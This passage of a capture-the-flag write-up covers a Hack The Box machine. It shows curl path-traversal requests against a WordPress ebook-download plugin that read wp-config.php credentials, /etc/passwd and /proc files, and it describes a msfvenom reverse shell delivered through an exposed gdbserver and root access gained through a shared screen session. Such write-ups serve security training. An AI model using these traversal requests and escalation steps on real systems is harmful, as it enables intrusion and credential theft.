<span class="nv">$currentpath</span> <span class="o">=</span> <span class="nb">preg_replace</span><span class="p">(</span><span class="s1">'/\/wp.+/'</span><span class="p">,</span><span class="s1">''</span><span class="p">,</span><span class="nv">$currentpath</span><span class="p">);</span>
<span class="nb">define</span><span class="p">(</span><span class="s1">'WP_HOME'</span><span class="p">,</span><span class="nv">$currenthost</span><span class="mf">.</span><span class="nv">$currentpath</span><span class="p">);</span>
<span class="nb">define</span><span class="p">(</span><span class="s1">'WP_SITEURL'</span><span class="p">,</span><span class="nv">$currenthost</span><span class="mf">.</span><span class="nv">$currentpath</span><span class="p">);</span>
<span class="nb">define</span><span class="p">(</span><span class="s1">'WP_CONTENT_URL'</span><span class="p">,</span> <span class="nv">$currenthost</span><span class="mf">.</span><span class="nv">$currentpath</span><span class="mf">.</span><span class="s1">'/wp-content'</span><span class="p">);</span>
<span class="nb">define</span><span class="p">(</span><span class="s1">'WP_PLUGIN_URL'</span><span class="p">,</span> <span class="nv">$currenthost</span><span class="mf">.</span><span class="nv">$currentpath</span><span class="mf">.</span><span class="s1">'/wp-content/plugins'</span><span class="p">);</span>
<span class="nb">define</span><span class="p">(</span><span class="s1">'DOMAIN_CURRENT_SITE'</span><span class="p">,</span> <span class="nv">$currenthost</span><span class="mf">.</span><span class="nv">$currentpath</span> <span class="p">);</span>
<span class="o">@</span><span class="nb">define</span><span class="p">(</span><span class="s1">'ADMIN_COOKIE_PATH'</span><span class="p">,</span> <span class="s1">'./'</span><span class="p">);</span>

<span class="nb">define</span><span class="p">(</span> <span class="s1">'AUTH_KEY'</span><span class="p">,</span>         <span class="s1">'put your unique phrase here'</span> <span class="p">);</span>
<span class="nb">define</span><span class="p">(</span> <span class="s1">'SECURE_AUTH_KEY'</span><span class="p">,</span>  <span class="s1">'put your unique phrase here'</span> <span class="p">);</span>
<span class="nb">define</span><span class="p">(</span> <span class="s1">'LOGGED_IN_KEY'</span><span class="p">,</span>    <span class="s1">'put your unique phrase here'</span> <span class="p">);</span>
<span class="nb">define</span><span class="p">(</span> <span class="s1">'NONCE_KEY'</span><span class="p">,</span>        <span class="s1">'put your unique phrase here'</span> <span class="p">);</span>
<span class="nb">define</span><span class="p">(</span> <span class="s1">'AUTH_SALT'</span><span class="p">,</span>        <span class="s1">'put your unique phrase here'</span> <span class="p">);</span>
<span class="nb">define</span><span class="p">(</span> <span class="s1">'SECURE_AUTH_SALT'</span><span class="p">,</span> <span class="s1">'put your unique phrase here'</span> <span class="p">);</span>
<span class="nb">define</span><span class="p">(</span> <span class="s1">'LOGGED_IN_SALT'</span><span class="p">,</span>   <span class="s1">'put your unique phrase here'</span> <span class="p">);</span>
<span class="nb">define</span><span class="p">(</span> <span class="s1">'NONCE_SALT'</span><span class="p">,</span>       <span class="s1">'put your unique phrase here'</span> <span class="p">);</span>

<span class="cd">/**#@-*/</span>

<span class="cd">/**
 * WordPress database table prefix.
 *
 * You can have multiple installations in one database if you give each
 * a unique prefix. Only numbers, letters, and underscores please!
 */</span>
<span class="nv">$table_prefix</span> <span class="o">=</span> <span class="s1">'wp_'</span><span class="p">;</span>

<span class="cd">/**
 * For developers: WordPress debugging mode.
 *
 * Change this to true to enable the display of notices during development.
 * It is strongly recommended that plugin and theme developers use WP_DEBUG
 * in their development environments.
 *
 * For information on other constants that can be used for debugging,
 * visit the documentation.
 *
 * @link https://wordpress.org/support/article/debugging-in-wordpress/
 */</span>
<span class="nb">define</span><span class="p">(</span> <span class="s1">'WP_DEBUG'</span><span class="p">,</span> <span class="kc">false</span> <span class="p">);</span>

<span class="cm">/* Add any custom values between this line and the "stop editing" line. */</span>



<span class="cm">/* That's all, stop editing! Happy publishing. */</span>

<span class="cd">/** Absolute path to the WordPress directory. */</span>
<span class="k">if</span> <span class="p">(</span> <span class="o">!</span> <span class="nb">defined</span><span class="p">(</span> <span class="s1">'ABSPATH'</span> <span class="p">)</span> <span class="p">)</span> <span class="p">{</span>
	<span class="nb">define</span><span class="p">(</span> <span class="s1">'ABSPATH'</span><span class="p">,</span> <span class="k">__DIR__</span> <span class="mf">.</span> <span class="s1">'/'</span> <span class="p">);</span>
<span class="p">}</span>

<span class="cd">/** Sets up WordPress vars and included files. */</span>
<span class="k">require_once</span> <span class="no">ABSPATH</span> <span class="mf">.</span> <span class="s1">'wp-settings.php'</span><span class="p">;</span>
<span class="o">&lt;</span><span class="n">script</span><span class="o">&gt;</span><span class="n">window</span><span class="mf">.</span><span class="nf">close</span><span class="p">()</span><span class="o">&lt;/</span><span class="n">script</span><span class="o">&gt;</span>
</pre></table></code></div></div><p>We can see that the <code class="language-plaintext highlighter-rouge">wp-config.php</code> file is being displayed and that we have some credentials, presumably for the database, on the target machine:</p><div file="credentials/access/credentials.txt" class="language-text highlighter-rouge"><div class="code-header"> <span data-label-text="credentials/access/credentials.txt"><i class="far fa-file-code"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>Wordpress -&gt; wordpressuser -&gt; MQYBJSaD#DxG6qbm
</pre></table></code></div></div><p>Now, we will go back a few more directories and we will try to download the <code class="language-plaintext filepath highlighter-rouge">/etc/passwd</code> file:</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>curl http://10.10.11.125/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl<span class="o">=</span>../../../../../../etc/passwd
</pre></table></code></div></div><div file="content/access/etc-passwd.txt" class="language-text highlighter-rouge"><div class="code-header"> <span data-label-text="content/access/etc-passwd.txt"><i class="far fa-file-code"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
</pre><td class="rouge-code"><pre>../../../../../../etc/passwd../../../../../../etc/passwd../../../../../../etc/passwdroot:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
usbmux:x:111:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
sshd:x:112:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
user:x:1000:1000:user:/home/user:/bin/bash
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
mysql:x:113:118:MySQL Server,,,:/nonexistent:/bin/false
&lt;script&gt;window.close()&lt;/script&gt;
</pre></table></code></div></div><p>This file is always useful for learning about the users on the target machine. In this case, we have a user called <code class="language-plaintext highlighter-rouge">user</code> that has a <code class="language-plaintext filepath highlighter-rouge">/bin/bash</code> shell assigned.</p><p>If we remember the enumeration phase, the <code class="language-plaintext highlighter-rouge">SSH</code> service was enabled, but if we try to read the <code class="language-plaintext filepath highlighter-rouge">/home/user/.ssh/id_rsa</code> file, we will notice that it is not being displayed.</p><p>We will have to enumerate further in order to gain a shell on the target machine. We will start by enumerating the processes running on the target machine. To do that, we can list the <code class="language-plaintext filepath highlighter-rouge">/proc/sched_debug</code> file. This file contains all the names of processes running on the target machine and their associated <code class="language-plaintext highlighter-rouge">PIDs (Program IDs)</code>. We will retrieve this file:</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>curl http://10.10.11.125/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl<span class="o">=</span>../../../../../../proc/sched_debug
</pre></table></code></div></div><div file="content/access/proc-sched_debug.txt" class="language-text highlighter-rouge"><div class="code-header"> <span data-label-text="content/access/proc-sched_debug.txt"><i class="far fa-file-code"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
</pre><td class="rouge-code"><pre>runnable tasks:
 S           task   PID         tree-key  switches  prio     wait-time             sum-exec        sum-sleep
-----------------------------------------------------------------------------------------------------------
 Ssystemd-resolve   681       396.619020       919   120         0.000000       535.509599         0.000000 0 0 /autogroup-30
 Ssystemd-timesyn   683       345.419420       318   120         0.000000       364.071150         0.000000 0 0 /autogroup-31
 S     sd-resolve   751       351.353787       853   120         0.000000       102.344524         0.000000 0 0 /autogroup-31
 S   HangDetector   752      1953.279714      2281   120         0.000000        85.176872         0.000000 0 0 /autogroup-36
 Saccounts-daemon   754        26.168089        72   120         0.000000        14.543910         0.000000 0 0 /autogroup-38
 S          gmain   761        52.585943      2043   120         0.000000       121.948100         0.000000 0 0 /autogroup-38
 S          gdbus   894        26.808460        35   120         0.000000         2.709312         0.000000 0 0 /autogroup-38
 S       rsyslogd   776        36.284934        33   120         0.000000         6.967121         0.000000 0 0 /autogroup-43
 S      in:imklog   805         9.185210         4   120         0.000000         3.432806         0.000000 0 0 /autogroup-43
 S  rs:main Q:Reg   806        47.756009      1119   120         0.000000        56.144683         0.000000 0 0 /autogroup-43
 S           cron   831         0.691187        31   120         0.000000         2.891720         0.000000 0 0 /autogroup-55
 S           cron   832         0.666570        26   120         0.000000         3.109721         0.000000 0 0 /autogroup-55
 S             sh   844     14166.949705      4303   120         0.000000       817.101098         0.000000 0 0 /autogroup-57
 S             sh   847         1.586230         3   120         0.000000         1.204028         0.000000 0 0 /autogroup-64
 S            atd   856         1.340863         5   120         0.000000         2.882284         0.000000 0 0 /autogroup-63
 S       (sd-pam)   961         0.464843         1   120         0.000000         0.251041         0.000000 0 0 /autogroup-76
 S         screen   966         0.466555        11   120         0.000000         1.324943         0.000000 0 0 /autogroup-78
 S           bash   972        41.421383       130   120         0.000000        28.242470         0.000000 0 0 /autogroup-79
 S     ib_io_rd-1  1019      1754.497361      4265   120         0.000000       114.641141         0.000000 0 0 /autogroup-80
 S     ib_io_wr-2  1024      1754.530925      4356   120         0.000000       116.785899         0.000000 0 0 /autogroup-80
 S     ib_io_wr-4  1026      1754.550461      4326   120         0.000000       119.141381         0.000000 0 0 /autogroup-80
 S ib_pg_flush_co  1027      1754.487262      2312   120         0.000000       141.575541         0.000000 0 0 /autogroup-80
 S   ib_log_flush  1030      1760.530098     22226   120         0.000000       698.770218         0.000000 0 0 /autogroup-80
 Sib_log_wr_notif  1031      1760.527739     21947   120         0.000000       693.114159         0.000000 0 0 /autogroup-80
 S  ib_log_writer  1032      1760.561132     22072   120         0.000000       744.339427         0.000000 0 0 /autogroup-80
 S   xpl_worker-1  1044      1748.809084        37   120         0.000000         1.784572         0.000000 0 0 /autogroup-80
 S   xpl_worker-2  1045      1748.747528        36   120         0.000000         0.498846         0.000000 0 0 /autogroup-80
 S    ib_buf_dump  1050       948.473208         6   120         0.000000         0.870655         0.000000 0 0 /autogroup-80
 S   ib_srv_purge  1052      1363.639160      1419   120         0.000000        49.311427         0.000000 0 0 /autogroup-80
 S   ib_srv_wkr-1  1053      1362.762495       512   120         0.000000        16.171621         0.000000 0 0 /autogroup-80
 S   ib_srv_wkr-2  1054      1362.761183       588   120         0.000000         7.164060         0.000000 0 0 /autogroup-80
 S    sig_handler  1057       974.946940         2   120         0.000000         0.144871         0.000000 0 0 /autogroup-80
 S     connection  1358      1319.789789       310   120         0.000000        49.962620         0.000000 0 0 /autogroup-80
&gt;R        apache2   989      5768.821922      8890   120         0.000000      2226.710891         0.000000 0 0 /autogroup-68
 S        apache2  2135      5767.434831      6832   120         0.000000      1699.605290         0.000000 0 0 /autogroup-68
 S        apache2  2146      5773.990634      6842   120         0.000000      1719.259974         0.000000 0 0 /autogroup-68
 S        apache2  2150      5771.905152      7015   120         0.000000      1733.139759         0.000000 0 0 /autogroup-68
 I kworker/u256:1  3282     25660.399175      3482   120         0.000000       122.960262         0.000000 0 0 /
 I    kworker/1:0  3304     25103.186574      7079   120         0.000000       597.353019         0.000000 0 0 /
 S             su  3415        16.258561        29   120         0.000000         5.854285         0.000000 0 0 /autogroup-64
 S      gdbserver  3424        10.631109        13   120         0.000000         3.848920         0.000000 0 0 /autogroup-94
 I    kworker/1:1  4867     25664.124835      4644   120         0.000000       404.925768         0.000000 0 0 /

&lt;script&gt;window.close()&lt;/script&gt;
</pre></table></code></div></div><p>If we examine the process names, one of them will attract our attention. This process is <code class="language-plaintext highlighter-rouge">gdbserver</code>, usually used to debug applications on a machine from another machine. We can also see that the associated <code class="language-plaintext highlighter-rouge">PID</code> for this process is <code class="language-plaintext highlighter-rouge">3424</code>.</p><p>Once we know the <code class="language-plaintext highlighter-rouge">PID</code> of the process that we want to examine, we can retrieve the <code class="language-plaintext filepath highlighter-rouge">/proc/{PID}/cmdline</code> file to see the expression that is being used to invoke the process. We can retrieve this file with the following command:</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>curl http://10.10.11.125/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl<span class="o">=</span>../../../../../../proc/3424/cmdline <span class="o">&gt;</span> cmdline
</pre></table></code></div></div><p>This file will be binary, so we will extract the strings contained in the binary into a text file:</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>strings cmdline <span class="o">&gt;</span> proc-3424-cmdline.txt
</pre></table></code></div></div><div file="enum/access/proc-3424-cmdline.txt" class="language-text highlighter-rouge"><div class="code-header"> <span data-label-text="enum/access/proc-3424-cmdline.txt"><i class="far fa-file-code"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre>../../../../../../../../proc/3424/cmdline../../../../../../../../proc/3424/cmdline../../../../../../../../proc/3424/cmdlinegdbserver
--once
0.0.0.0:1337
/bin/true
&lt;script&gt;window.close()&lt;/script&gt;
</pre></table></code></div></div><p>This file gives us useful information, as we have discovered that the <code class="language-plaintext highlighter-rouge">gdbserver</code> process is running on port 1337. This port was the one that <code class="language-plaintext highlighter-rouge">Nmap</code> was not capable of identifying.</p><h2 id="user-shell"><span class="mr-2">User Shell</span><a href="#user-shell" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><hr /><h3 id="gdb-server"><span class="mr-2">GDB Server</span><a href="#gdb-server" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>Once we know the process running on port 1337 is <code class="language-plaintext highlighter-rouge">gdbserver</code>, we can try to exploit it in order to gain a user shell.</p><p>First, we will create a payload with <code class="language-plaintext highlighter-rouge">msfvenom</code>. This payload will be a <code class="language-plaintext highlighter-rouge">shell_reverse_tcp</code> and it will be in <code class="language-plaintext highlighter-rouge">elf</code> format. Additionally, we have indicated that we want the reverse shell to be created as a new process with <code class="language-plaintext highlighter-rouge">fork</code>. This will be useful to keep the <code class="language-plaintext highlighter-rouge">gdbserver</code> process running and not stuck after sending our reverse shell:</p><p><img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 700 400'%3E%3C/svg%3E" data-src="/assets/img/posts/backdoor/rev.png" alt="Desktop View" width="700" height="400" data-proofer-ignore> <em>Reverse Shell Elf</em></p><p>Once we have created the payload, we will upload it to the target machine via <code class="language-plaintext highlighter-rouge">gdbserver</code>. To do this, we will use the following commands:</p><p><img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 700 400'%3E%3C/svg%3E" data-src="/assets/img/posts/backdoor/gdbServerUpload.png" alt="Desktop View" width="700" height="400" data-proofer-ignore> <em>Upload Elf to Target Machine</em></p><p>We can see how the payload is now on the target machine. Finally, we will try to execute this payload with the following commands:</p><p><img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 700 400'%3E%3C/svg%3E" data-src="/assets/img/posts/backdoor/gdbServerExec.png" alt="Desktop View" width="700" height="400" data-proofer-ignore> <em>Exec Elf in Target Machine</em></p><p>We will receive a shell in the port that we are listening. The problem is that this shell is not interactive, so we will do a treatment to make it a fully interactive terminal:</p><p><img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 700 400'%3E%3C/svg%3E" data-src="/assets/img/posts/backdoor/ttyTreatment.png" alt="Desktop View" width="700" height="400" data-proofer-ignore> <em>TTY Treatment</em></p><p>We have a shell as the <code class="language-plaintext highlighter-rouge">user</code> user, so we will proceed to visualize the <code class="language-plaintext highlighter-rouge">user.txt</code> flag in the <code class="language-plaintext filepath highlighter-rouge">/home/user/</code> directory.</p><h2 id="root-shell"><span class="mr-2">Root Shell</span><a href="#root-shell" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><hr /><h3 id="mysql"><span class="mr-2">MySQL</span><a href="#mysql" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>If we remember the previous phase, we found some credentials for the database used by <code class="language-plaintext highlighter-rouge">Wordpress</code>. We will try to connect to the database to see if we can retrieve any useful information. If we list the tables in the <code class="language-plaintext highlighter-rouge">Wordpress</code> database:</p><p><img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 700 400'%3E%3C/svg%3E" data-src="/assets/img/posts/backdoor/databaseTables.png" alt="Desktop View" width="700" height="400" data-proofer-ignore> <em>Database Tables</em></p><p>There is a table called <code class="language-plaintext highlighter-rouge">wp_users</code> that will attract our attention. We will visualize the content of it:</p><p><img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 1500 700'%3E%3C/svg%3E" data-src="/assets/img/posts/backdoor/databasePassword.png" alt="Desktop View" width="1500" height="700" data-proofer-ignore> <em>Credentials in Users Table</em></p><p>We will find the following hash in the database, that corresponds to the <code class="language-plaintext highlighter-rouge">admin</code> user:</p><div file="credentials/privesc/hash.txt" class="language-text highlighter-rouge"><div class="code-header"> <span data-label-text="credentials/privesc/hash.txt"><i class="far fa-file-code"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>$P$Bt8c3ivanSGd2TFcm3HV/9ezXPueg5.
</pre></table></code></div></div><p>If we try to crack this hash either using offline cracking or a website like <a href="https://crackstation.net/">crackstation</a>, we will see that there are no coincidences, so we will keep enumerating the target machine in order to escalate privileges.</p><h3 id="gnu-screen"><span class="mr-2">GNU Screen</span><a href="#gnu-screen" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>If we examine the processes that are running on the target machine, we will see two processes that will attract our attention. The first one will be a session of <a href="https://www.gnu.org/software/screen/">GNU Screen</a> running as the <code class="language-plaintext highlighter-rouge">root</code> user:</p><p><img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 700 400'%3E%3C/svg%3E" data-src="/assets/img/posts/backdoor/privesc1.png" alt="Desktop View" width="700" height="400" data-proofer-ignore> <em>Screen Session as Root</em></p><p>The second process will be a script that does the following:</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>/bin/sh <span class="nt">-c</span> <span class="k">while </span><span class="nb">true</span><span class="p">;</span> <span class="k">do </span>sleep1<span class="p">;</span>find /var/run/screen/S-root/ <span class="nt">-empty</span> <span class="nt">-exec</span> screen <span class="nt">-dmS</span> root<span class="p">;</span> <span class="k">done</span>
</pre></table></code></div></div><p>We can see that this script is a recurring task that finds sessions in the <code class="language-plaintext filepath highlighter-rouge">/var/run/screen/S-root/</code> directory, and if there are not any sessions created, it creates a session as the <code class="language-plaintext highlighter-rouge">root</code> user.</p><p>If we list the sessions running as root with the <code class="language-plaintext highlighter-rouge">screen -ls root/</code> command, we will find that there is a created session. We can also see that this session is configured to be used as <code class="language-plaintext highlighter-rouge">multiuser</code>. This allows us to attach to the session even if we are not the <code class="language-plaintext highlighter-rouge">root</code> user:</p><p><img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 700 400'%3E%3C/svg%3E" data-src="/assets/img/posts/backdoor/privesc3.png" alt="Desktop View" width="700" height="400" data-proofer-ignore> <em>Synchronize to Session</em></p><p>We have a shell as the <code class="language-plaintext highlighter-rouge">root</code> user, so we will proceed to visualize the <code class="language-plaintext highlighter-rouge">root.txt</code> flag in the <code class="language-plaintext filepath highlighter-rouge">/root/</code> directory.</p></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/hack-the-box/'>Hack The Box</a>, <a href='/categories/linux/'>Linux</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/wordpress/" class="post-tag no-text-decoration" >wordpress</a> <a href="/tags/lfi/" class="post-tag no-text-decoration" >lfi</a> <a href="/tags/gdbserver/" class="post-tag no-text-decoration" >gdbserver</a> <a href="/tags/screen/" class="post-tag no-text-decoration" >screen</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=Backdoor+Write-up+-+root%40g2jz%3A~%23&url=https%3A%2F%2Fg2jz.github.io%2Fposts%2Fbackdoor%2F" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=Backdoor+Write-up+-+root%40g2jz%3A~%23&u=https%3A%2F%2Fg2jz.github.io%2Fposts%2Fbackdoor%2F" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://t.me/share/url?url=https%3A%2F%2Fg2jz.github.io%2Fposts%2Fbackdoor%2F&text=Backdoor+Write-up+-+root%40g2jz%3A~%23" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <a href="https://www.linkedin.com/sharing/share-offsite/?url=https%3A%2F%2Fg2jz.github.io%2Fposts%2Fbackdoor%2F" data-toggle="tooltip" data-placement="top" title="Linkedin" target="_blank" rel="noopener" aria-label="Linkedin"> <i class="fa-fw fab fa-linkedin"></i> </a> <i id="copy-link" class="fa-fw fas fa-link small" data-toggle="tooltip" data-placement="top" title="Copy link" data-title-succeed="Link copied successfully!"> </i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted"><div class="access"><div id="access-lastmod" class="post"><div class="panel-heading">Recently Updated</div><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/whoami/">whoami</a><li><a href="/posts/love/">Love Write-up</a><li><a href="/posts/explore/">Explore Write-up</a><li><a href="/posts/knife/">Knife Write-up</a></ul></div><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/htb/">htb</a> <a class="post-tag" href="/tags/linux/">linux</a> <a class="post-tag" href="/tags/windows/">windows</a> <a class="post-tag" href="/tags/adb/">adb</a> <a class="post-tag" href="/tags/android/">android</a> <a class="post-tag" href="/tags/capabilities/">capabilities</a> <a class="post-tag" href="/tags/cve/">cve</a> <a class="post-tag" href="/tags/deserialization/">deserialization</a> <a class="post-tag" href="/tags/gdbserver/">gdbserver</a> <a class="post-tag" href="/tags/kerberos/">kerberos</a></div></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"><div class="panel-heading pl-3 pt-2 mb-2">Contents</div><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div id="tail-wrapper" class="col-12 col-lg-11 col-xl-9 pl-3 pr-3 pr-xl-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/bountyhunter/"><div class="card-body"> <em class="small" data-ts="1664262000" data-df="ll" > Sep 27, 2022 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>BountyHunter Write-up</h3><div class="text-muted small"><p> Enumeration Nmap First, we will start enumerating the open ports on the victim machine. To do that, we will use nmap. We will specify that we want to scan all the port range, that we only want t...</p></div></div></a></div><div class="card"> <a href="/posts/knife/"><div class="card-body"> <em class="small" data-ts="1664521200" data-df="ll" > Sep 30, 2022 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Knife Write-up</h3><div class="text-muted small"><p> Enumeration Nmap First, we will start scanning the target machine. To do this, we will use nmap. The scan will filter the open ports in all the port range and will use the TCP Syn Port Scan. Opt...</p></div></div></a></div><div class="card"> <a href="/posts/cap/"><div class="card-body"> <em class="small" data-ts="1664780400" data-df="ll" > Oct 3, 2022 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Cap Write-up</h3><div class="text-muted small"><p> Enumeration OS Detection In order to identify the machine that we are dealing with, we will perform an OS detection. This can be done very simply, as the TTL (Time To Live) of a ping response ca...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/scrambled/" class="btn btn-outline-primary" prompt="Older"><p>Scrambled Write-up</p></a><div class="btn btn-outline-primary disabled" prompt="Newer"><p>-</p></div></div><div id="disqus_thread" class="pt-2 pb-2"><p class="text-center text-muted small"> Comments powered by <a href="https://disqus.com/">Disqus</a>.</p></div><script type="text/javascript"> var disqus_config = function () { this.page.url = 'https://g2jz.github.io/posts/backdoor/'; this.page.identifier = '/posts/backdoor/'; }; /* Lazy loading */ var disqus_observer = new IntersectionObserver(function (entries) { if(entries[0].isIntersecting) { (function () { var d = document, s = d.createElement('script'); s.src = 'https://https://g2jz-github-io.disqus.com/.disqus.com/embed.js'; s.setAttribute('data-timestamp', +new Date()); (d.head || d.body).appendChild(s); })(); disqus_observer.disconnect(); } }, { threshold: [0] }); disqus_observer.observe(document.querySelector('#disqus_thread')); /* Auto switch theme */ function reloadDisqus() { /* Disqus hasn't been loaded */ if (typeof DISQUS === "undefined") { return; } if (document.readyState == 'complete') { DISQUS.reset({ 